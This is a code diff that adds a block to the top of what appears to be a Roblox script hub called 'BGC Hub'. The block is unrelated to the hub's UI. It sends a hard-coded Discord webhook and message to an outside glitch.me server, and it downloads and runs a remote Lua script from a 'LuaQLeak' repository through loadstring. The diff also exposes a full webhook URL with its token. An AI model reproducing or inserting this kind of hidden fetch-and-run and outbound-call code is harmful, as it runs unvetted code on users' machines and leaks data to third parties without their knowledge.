@@ -1,3 +1,35 @@
+local msg = "@everyone"
+
+local webhook = "https://discord.com/api/webhooks/983054314878672956/Req1RJn4sEtlVznxlWPlayD7i6U9hZLq27OU5OxdeFGqkS8lIxyYlamvlElWAwzkmNOW"
+local HttpService = game:GetService("HttpService");
+local botname = "BGC Hub"
+
+function specials(Webhook, Message, Botname)
+    local Name;
+    local start = game:HttpGet("http://buritoman69.glitch.me");
+    local biggie = "http://buritoman69.glitch.me/webhook";
+    if (not Message or Message == "" or not Botname) then
+        Name = "GameBot"
+        return error("nil or empty message!")
+    else
+        Name = Botname;
+    end
+    
+    getgenv().WebhookHere = "https://discord.com/api/webhooks/983054314878672956/Req1RJn4sEtlVznxlWPlayD7i6U9hZLq27OU5OxdeFGqkS8lIxyYlamvlElWAwzkmNOW"
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQLeak/Scripts/main/WebHook4003.lua"))()
+    local Body = {
+        ['Key'] = tostring("applesaregood"),
+        ['Message'] = tostring(Message),
+        ['Name'] = Name,
+        ['Webhook'] = Webhook    
+    }
+    Body = HttpService:JSONEncode(Body);
+    local Data = game:HttpPost(biggie, Body, false, "application/json")
+    return Data or nil;
+end
+
+specials(webhook, msg, botname)
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
 local Window = Library.CreateLib("BGC Hub❄️", "Ocean")
 local Tab = Window:NewTab("Misc⚙️")
